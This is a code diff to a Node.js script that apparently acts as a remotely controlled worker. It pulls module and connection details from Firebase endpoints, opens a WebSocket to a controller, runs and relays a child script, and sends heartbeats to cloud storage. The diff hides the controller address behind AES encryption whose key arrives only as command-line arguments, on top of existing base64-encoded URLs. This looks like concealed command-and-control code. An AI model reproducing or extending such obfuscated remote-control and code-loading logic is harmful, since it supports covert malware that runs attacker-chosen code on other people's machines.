@@ -9,11 +9,15 @@ let mScript = null
 let CONNECTION = null
 let reconnecting = false
 let finishStatus = false
+let processIsWork = false
+let finishRequire = false
 let USER = getUserName()
 let FINISH = new Date().getTime()+21000000
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
+let BASE_URL = decrypt('Ho3w4e0EI9uVPoN9hhxdI4hRUNMBXjo9s8vy5IT9Wh3WhysrJlYcqaa0offkbJzez3xIVwAtUfV1argzGbiIvw==')
 
+// USER = 'niygpxrclq52665'
 
 startServer()
 
@@ -34,10 +38,13 @@ async function startServer() {
     console.log('Node: ---START-SERVER---')
 
     let module = await onModuleDetails()
+
     if (!module) {
         console.log('---PROCESS-CLOSE---')
         process.exit(0)
     }
+
+    finishRequire = module.require ?? false
 
     await checkStatus(true)
     
@@ -46,17 +53,17 @@ async function startServer() {
 
 async function onModuleDetails() {
     try {
-        let data = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L3J1bm5pbmcv')+USER+'.json')
-
+        let data = await getAxios(BASE_URL+'running/'+USER+'.json')
+        
         if (data && data.module) {
-            let database = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2RhdGFiYXNlLw==')+data.database+'.json')
+            let database = await getAxios(BASE_URL+'database/'+data.database+'.json')
             
             if (database) {
                 await runWebSocket(database)
                 console.log('Node: ---SOCKET-CONNECTION-SUCCESS---')
             }
 
-            let module = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L21vZHVsZS8=')+data.module+'.json')
+            let module = await getAxios(BASE_URL+'module/'+data.module+'.json')
             
             if (module) {
                 return module
@@ -137,19 +144,27 @@ function sendWSMessage(connection, data) {
 
 async function checkStatus(firstTime) {
     if (FINISH > 0 && FINISH < new Date().getTime()) {
-        await closeProcess()
+        if (finishRequire) {
+            if (processIsWork) {
+                try {
+                    mScript.send({ t:9, s:true })
+                } catch (error) {
+                    await closeProcess()
+                }
+            } else {
+                await closeProcess()
+            }
+        } else {
+            await closeProcess()
+        }
     } else {
         if (!firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
 
-        if (FINISH > 0 && FINISH < new Date().getTime()) {
-            await closeProcess()
-        } else {
-            try {
-                await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
-                    'Content-Type':'1/'+Date.now()
-                })
-            } catch (error) {}
-        }
+        try {
+            await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
+                'Content-Type':'1/'+Date.now()
+            })
+        } catch (error) {}
     }
 }
 
@@ -230,11 +245,18 @@ async function runDynamicServer(data) {
         }
 
         mScript.on('message', (data) => {
-            if (typeof data === 'string') {
-                sendWSMessage(CONNECTION, data)
-            } else {
-                sendWSMessage(CONNECTION, JSON.stringify(data))
-            }
+            try {
+                let json = data
+                if (typeof data === 'string') {
+                    json = JSON.parse(data)
+                }
+                
+                if (json.t == 9) {
+                    processIsWork = json.s ?? false
+                } else {
+                    sendWSMessage(CONNECTION, JSON.stringify(json))
+                }
+            } catch (error) {}
         })
 
         mScript.on('exit', () => {
@@ -301,15 +323,20 @@ function getUserName() {
     return null
 }
 
-function randomWebSocketKey() {
-    let arr = []
-    for (let i = 0; i < 16; i++) {
-        arr.push(Math.floor(Math.random() * 256))
+function decrypt(text) {
+    try {
+        let argv = process.argv.slice(2)
+        if (argv.length < 2) {
+            return null
+        }
+        let key = Buffer.from(argv[0], 'base64')
+        let iv  = Buffer.from(argv[1], 'base64')
+        let cipher = crypto.createDecipheriv('aes-192-cbc', key, iv)
+        return cipher.update(text, 'base64', 'utf8') + cipher.final('utf8')
+    } catch (e) {
+        return null
     }
-    let binary = String.fromCharCode(...arr)
-    return Buffer.from(binary, 'binary').toString('base64')
 }
-
 
 function decode(data) {
     return Buffer.from(data, 'base64').toString('utf-8')
